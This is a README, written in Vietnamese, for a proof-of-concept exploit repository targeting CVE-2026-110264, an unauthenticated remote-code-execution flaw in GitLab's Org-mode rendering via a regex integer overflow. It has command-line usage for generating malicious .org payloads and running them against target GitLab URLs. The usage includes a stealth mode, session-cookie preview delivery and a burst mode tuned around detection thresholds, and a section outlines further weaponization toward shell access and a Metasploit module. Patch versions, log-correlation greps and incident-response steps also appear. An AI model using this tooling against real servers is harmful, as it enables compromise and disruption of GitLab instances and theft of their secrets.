# PoC CVE-2026-110264 — GitLab Org-mode / Onigmo Unauthenticated RCE (CVSS 10.0)

[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Research status: validated](https://img.shields.io/badge/research-validated-success.svg)](reports/lab-evidence-19.3.1.md)

PoC hoàn thiện cho lỗ hổng **thực thi mã từ xa không cần xác thực** trong mọi
GitLab CE/EE từ 7.0 (2014) tới trước bản vá 21/10/2026, qua integer overflow trong
trình biên dịch regexp (Onigmo của Ruby) khi render file `.org`.

* Báo cáo đầy đủ (EN): [`reports/CVE-2026-110264.md`](reports/CVE-2026-110264.md)
* Evidence lab GitLab 19.3.1 vulnerable (EN): [`reports/lab-evidence-19.3.1.md`](reports/lab-evidence-19.3.1.md)
* Lab nhẹ (không cần GitLab): [`lab/repro.rb`](lab/repro.rb)
* Lab GitLab đầy đủ: [`lab/docker-compose.gitlab.yml`](lab/docker-compose.gitlab.yml) + [`lab/provision_lab.py`](lab/provision_lab.py) + evidence JSONs

## Tóm tắt 30 giây

1. Attacker nhúng regex độc vào dòng `#+TODO:` trong file `.org`
   (`lib/org-ruby/parser.rb` escape 1 lần lúc kiểm tra, nhưng
   `lib/org-ruby/headline.rb:100` lại `Regexp.new("^#{keyword}\\s*")` bằng
   **chuỗi thô** — CWE-94).
2. Keyword có > 32 767 repeat làm tràn ID repeat int16 của Onigmo → ghi ngoài
   biên lúc match (CWE-787), groom heap bằng request body → `system()` với
   quyền OS user `git`. Không cần đăng nhập, chỉ cần 1 project Public chứa
   file `.org` (hoặc ép renderer Org qua tham số `file_path` ở preview API).
3. Bản vá: Ruby repeat-ID overflow patch cho 3.3/3.4/4.0 + `gitlab-markup 2.2.0`.
   Bản vá nằm trong 18.11.13, 19.0.10, 19.1.9, 19.2.9, 19.3.6, 19.4.3, 19.5.1.

## Cấu trúc

```
poc.py                        PoC chính (chỉ dùng stdlib): check | payload | exploit | selftest
lab/repro.rb                  renderer mini giống GitLab OtherMarkup (Timeout + org-ruby)
lab/verify.sh                 script kiểm chứng end-to-end (8 checks, không cần GitLab)
lab/provision_lab.py          provision lab GitLab (tạo project public + upload payload)
lab/evidence_m1_20000.json    evidence poc.py --verify vs lab 19.3.1 (m1.org, VULN)
lab/evidence_p0_35000.json    evidence poc.py --verify vs lab 19.3.1 (p0.org, VULN)
lab/Dockerfile.ruby           image repro nhẹ (ruby + org-ruby 0.9.12)
lab/docker-compose.gitlab.yml lab GitLab CE vulnerable đầy đủ (đã kiểm chứng với 19.3.1)
nuclei/cve-2026-110264-gitlab-version.yaml  template Nuclei fingerprint version (safe)
reports/CVE-2026-110264.md    báo cáo lỗ hổng chi tiết
reports/lab-evidence-19.3.1.md evidence live-lab (client oracle + server Timeout::Error)
```

## Yêu cầu

* Python 3.8+ (không cần pip gì thêm).
* Để chạy `selftest` end-to-end: `gem install org-ruby -v 0.9.12` (+ `ruby`).
* Để bắn GitLab thật: 1 project **Public** + quyền commit file (chỉ vector
  show mới cần commit; vector preview thì commit-less nhưng có thể đòi session
  tùy cấu hình).

## Cách dùng

```sh
# 0. Tự kiểm chứng root-cause, không cần GitLab
python3 poc.py selftest
ruby lab/repro.rb --generate 35000 p0.org
ruby lab/repro.rb p0.org --budget 8        # expect: Timeout::Error (vulnerable)

# 1. Sinh payload (mặc định 35000 repeats = vượt ngưỡng int16 32767)
python3 poc.py payload --repeats 35000 -o p0.org
python3 poc.py payload --stealth -o p0_stealth.org   # A*x40000, quiet-match
python3 poc.py payload --single -o p0_single.org    # chỉ #+TODO: (mặc định cả 3)
#    p0.org ~1.5 MB (3 directives x 385k-char keyword):
#      #+TODO: [[:word:]]*[[:word:]]*...
#      #+SEQ_TODO: [[:word:]]*...
#      #+TYP_TODO: [[:word:]]*...
#      * [[:word:]]*[[:word:]]*... hello

# 2. Fingerprint version (unauth; thêm --token nếu có PAT để đọc /api/v4/version)
python3 poc.py check https://gitlab.example
#    VULN nếu < fixed của nhánh mình:
#      18.11.13 | 19.0.10 | 19.1.9 | 19.2.9 | 19.3.6 | 19.4.3 | 19.5.1

# 3a. Khai thác qua Blob show (unauth, cần đã commit p0.org vào project Public)
#     Web UI -> New file -> upload p0.org lên nhánh main trước
python3 poc.py exploit https://gitlab.example group/pub --ref main --path p0.org
#     Differential chắc chắn hơn (control benign + so sánh delta):
python3 poc.py exploit https://gitlab.example group/pub --verify --save evidence.json
#     Campaign mode (mimic detection threshold >=5/30m) + stealth:
python3 poc.py exploit https://gitlab.example group/pub --burst 6 --interval 2 --save evidence.json
python3 poc.py exploit https://gitlab.example group/pub --stealth --path p0_stealth.org

# 3b. Khai thác commit-less qua preview (renderer ép bằng file_path, có thể cần cookie)
python3 poc.py exploit https://gitlab.example group/pub --preview --content-file p0.org
python3 poc.py exploit https://gitlab.example group/pub --preview-only \
  --content-file p0.org --cookie '_gitlab_session=...'
```

### Đọc kết quả `exploit`

Rich viewer mới là sink thật: blob HTML chỉ trả chrome (không thấy TODO, ~38 kB,
không differential); render Org nằm ở `GET .../blob/main/<file>?format=json&viewer=rich`
(`gl.startup_calls` trong HTML). PoC v2.1+ bắn thẳng endpoint này (control benign
cũng qua rich sink) — xem `reports/lab-evidence-19.3.1.md`.

| Tín hiệu | Ý nghĩa |
|---|---|
| Render chậm ≥ 10 s | Vượt markup Timeout budget → server ghi `Timeout::Error / OtherMarkup / .org` (`exceptions_json.log`). ≥ 5 lần/30 phút từ 1 client = rule `org_mode_render_error_burst` |
| HTTP 502 | Workhorse `badgateway: EOF` — Puma worker chết giữa lúc render (RCE chạy đồng bộ trong worker rồi worker crash; Puma thay worker mới) |
| 200 nhanh (< 5 s) | Có thể đã patch, sai path/ref, project Private, hoặc preview bị chặn auth |
| 404/302 về sign-in | File chưa tồn tại hoặc project không Public |

Tương quan phía server (nếu có quyền đọc log) để khẳng định:

```sh
grep '"exception.class":"Timeout::Error"' /var/log/gitlab/gitlab-rails/exceptions_json.log \
  | grep '"extra.class_name":"OtherMarkup"' | grep -E '"extra.file_name":"[^"]*\.org"'
grep -E '502|badgateway' /var/log/gitlab/gitlab-workhorse/current
grep -B1 -A20 '\[BUG\]' /var/log/gitlab/puma/puma_stderr.log \
  | grep -E 'org-ruby|headline\.rb|regexp_helper\.rb|match_at|onig_search_gpos|onig_compile|compile_tree|rb_str_sub_bang'
rg -l --glob '**/*.org' '^\#\+(TODO|SEQ_TODO|TYP_TODO):.{500,}'   # quét payload phía git
```

## Kết quả đã kiểm chứng

### A. Live GitLab CE 19.3.1 vulnerable (22/10/2026, toàn bộ trong container)
`atk-cve-2026-110264` → `gitlab-110264-vuln` (bridge, unauth; chi tiết ở
`reports/lab-evidence-19.3.1.md`):
* `poc.py check --token`: `api_version 19.3.1` → `[VULN]` (< 19.3.6).
* `poc.py exploit --verify`: control README rich 0.1–0.2s vs m0.org (20000)
  rich **10.2s**, p0.org (35000) rich **18.8s** → `[VULN] differential confirms`,
  `rc=0` + evidence JSON (`lab/evidence_*.json`).
* Server-side: `exceptions_json.log` ghi 4x `Timeout::Error / OtherMarkup /
  m1.org|p0.org`, `BlobController#show`, `user.username=null` (unauth),
  backtrace `render_timeout.rb → other_markup.rb → blob_controller.rb:316
  show_json` — đúng shape rule `org_mode_render_error_burst`. `puma_stderr.log`
  không `[BUG]` (quiet-hit, đã dự liệu: crash chỉ corroborating).
* Stack lab: `ruby 3.3.12`, `org-ruby 0.9.12`, `gitlab-markup 2.1.0`.

### B. Local repro (workstation + container, ruby 3.3.8/3.4.10 + org-ruby 0.9.12)

* `poc.py selftest` (3-tier): benign n=5 → `RENDER_OK` 0.0s; medium n=5000 →
  `RENDER_OK` ~1.2s; large n=35000 → `RENDER_TIMEOUT, TIME=25.1s` → `[VULN]`.
* `lab/verify.sh`: **8/8 PASS** (selftest VULN + 3-directive loud/stealth +
  benign-fast + loud-Timeout + dead-server rc=1 + evidence JSON).
* `lab/repro.rb` cho cùng oracle Timeout mà không cần GitLab.
* Nuclei template: fingerprint version safe (không bắn payload DoS); render
  oracle chủ động nằm ở `poc.py exploit --verify/--burst`.
* Full-GitLab detonation đã được kiểm chứng trên GitLab CE 19.3.1; compose + câu
  lệnh tương quan log nằm trong `lab/`. Giai đoạn heap-groomed `system()` vẫn là
  công việc per-build. Tiền lệ vector chị em
  CVE-2026-97229: Rapid7 RCE thành `system()` as `git` trên `gitlab-ce:19.4.1`
  trong 1 ngày sau patch 12/10 với cùng dạng delivery (`ci/lint?content_ref=` →
  502 + callback).

## Phòng thủ / vá

* **Nâng cấp ngay** lên 19.5.1 / 19.4.3 / 19.3.6 (hoặc 19.2.9 / 19.1.9 / 19.0.10 /
  18.11.13 nếu giữ nhánh cũ). GitLab.com/Dedicated đã được vá. Không có workaround
  chính thức — chỉ bản vá mới chắc chắn; giảm visibility Public của project có
  render `.org` chỉ là giảm thiểu tạm thời.
* Chú ý 19.4.3/19.3.6 có migration (single-node downtime; multi-node theo quy
  trình zero-downtime).
* Sau khi vá: giữ 2 rule TLDR (`onigmo_native_worker_crash`,
  `org_mode_render_error_burst`) + Workhorse 502 + git-side `#+TODO:` scan chạy
  song song một thời gian để bắt campaign tồn dư.
* Nếu nghi bị khai thác thành công (render burst rồi im lặng bất thường, worker
  crash, `git`-owned file lạ trong `/tmp`, tiến trình con lạ của Puma/Sidekiq):
  coi như instance đã bị chiếm — xoay `gitlab-secrets.json`, toàn bộ CI variable,
  runner token, access token; giữ nguyên log làm chứng cứ.

## Giới hạn & hướng weaponize tiếp

* Tới 22/10/2026 chưa có exploit RCE công khai; GitLab báo chưa thấy khai thác
  thực tế, CISA KEV chưa liệt kê. Nửa RCE của PoC này ở mức oracle
  (Timeout burst + 502 + `[BUG]`), chưa tới shell — đúng với trạng thái intel công khai.
* Host ít RAM: kernel OOM-kill worker (chỉ còn 502 + Timeout, mất `[BUG]`) — vẫn
  là oracle hợp lệ, đừng loại trừ chỉ vì không thấy crash dump.
* Bước tiếp theo theo từng build (Ruby 3.3/3.4/4.0, amd64/arm64, Omnibus/CNG):
  hiệu chỉnh pcode/offset (kiểu `SYSTEM_STEP_COUNT` của Rapid7), biến thể path
  4-byte UTF-8 để nhân hệ số recompilation, kiểm tra vector pipeline (Sidekiq),
  bọc thêm template Nuclei + module Metasploit.

## Tham khảo

* Advisory + MR patch + detections:
  https://docs.gitlab.com/releases/patches/patch-release-gitlab-19-5-1-released/
* Phân tích kỹ thuật vector CI chị em (cùng reporter joaxcar, cùng engine,
  đã weaponize tới `system()` as `git`):
  https://www.rapid7.com/blog/post/ra-gitlab-ci-cd-regex-integer-overflow-technical-analysis-cve-2026-97229/
* Source: `org-ruby` 0.9.12 `headline.rb`/`parser.rb`; The Hacker News 21/10/2026;
  Cyber Security News 22/10/2026.

## Standalone exploit

`python3 exploit/exploit.py` runs the full chain (exit 1 exploited, 0 safe).
